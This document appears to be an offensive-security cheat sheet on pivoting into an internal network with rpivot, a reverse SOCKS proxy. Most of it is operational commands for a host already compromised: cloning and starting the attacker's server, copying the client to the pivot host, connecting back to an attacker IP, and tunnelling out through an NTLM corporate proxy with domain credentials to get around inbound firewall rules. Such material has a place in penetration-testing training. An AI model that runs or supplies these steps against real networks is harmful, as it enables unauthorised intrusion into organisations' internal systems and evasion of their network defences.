# Web Server Pivoting with rpivot

## Overview

**rpivot** is a Python-based **reverse SOCKS proxy** tool. It is utilized to connect a machine inside a restricted corporate network to an external server, exposing the internal network by creating a tunnel. This technique is essential for **pivoting** into internal segments when direct inbound connections to the pivot host are unavailable.

---

## Scenario 1: Standard Reverse SOCKS Tunneling

Use this technique when you have compromised a host with access to an internal network and need to route traffic from your attack machine to internal targets.

### Operational Workflow

1. **Prepare the Attack Host**: Clone the repository and ensure **Python 2.7** is installed, as rpivot relies on this version.
2. git clone https://github.com/klsecservices/rpivot.git
3. **Start the rpivot Server**: Execute the server script on the attack machine. This listener will wait for a connection from the pivot host.
4. **Transfer the Tool**: Move the rpivot directory to the compromised pivot host.
5. **Establish the Reverse Connection**: Run the client script on the pivot host, pointing it back to the attack machine's listening port.
6. **Configure Proxychains**: Ensure your attack host's proxychains configuration (typically `127.0.0.1:9050`) matches the `--proxy-port` defined on the server.
7. **Access Internal Targets**: Use tools via proxychains to interact with internal resources.

### Command Reference

|Component|Action|Command|
|:--|:--|:--|
|**Attack Host**|Install Python 2.7|`sudo apt-get install python2.7`|
|**Attack Host**|Start Server|`python2.7 server.py --proxy-port <LOCAL_PORT> --server-port <LISTEN_PORT> --server-ip 0.0.0.0`|
|**Attack Host**|Transfer to Target|`scp -r rpivot <USERNAME>@<PIVOT_IP>:<PATH>`|
|**Pivot Host**|Start Client|`python2.7 client.py --server-ip <ATTACK_IP> --server-port <LISTEN_PORT>`|
|**Attack Host**|Access Web Target|`proxychains firefox-esr <TARGET_IP>:<PORT>`|

**Parameter Descriptions:**

- `--proxy-port`: The local port on the attack host where proxychains will send traffic (e.g., 9050).
- `--server-port`: The port the attack host listens on for the incoming client connection (e.g., 9999).

---

## Scenario 2: Pivoting Through NTLM Proxies

Use this technique in highly restricted environments where the pivot host cannot reach the attack host directly and must traverse an **HTTP-proxy with NTLM authentication**.

### Operational Workflow

1. **Identify Credentials**: This method requires a valid **domain username, password, and domain name** to authenticate through the corporate proxy.
2. **Execute Client with NTLM Flags**: Run the client script on the pivot host, providing the proxy IP, proxy port, and NTLM credentials.

### Command Reference

| Command                                                                                                                                                                                 | Goal                                                             |     |
| :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :--------------------------------------------------------------- | --- |
| `python client.py --server-ip <TARGET_IP> --server-port <PORT> --ntlm-proxy-ip <PROXY_IP> --ntlm-proxy-port <PROXY_PORT> --domain <DOMAIN> --username <USERNAME> --password <PASSWORD>` | Establish a pivot through a proxy requiring NTLM authentication. |     |
|                                                                                                                                                                                         |                                                                  |     |

---

## Attack Implications

- **Unlocks Internal Access**: Successfully establishing the tunnel allows the attack machine to communicate with any IP/port reachable by the pivot host.
- **Application-Layer Access**: Enables the use of standard browsers and tools to interact with internal web servers and services as if they were locally accessible.
- **Reverse Connection Advantage**: Since the pivot host initiates the connection to the attack host, this technique often bypasses restrictive firewall rules that block inbound connections to the pivot host.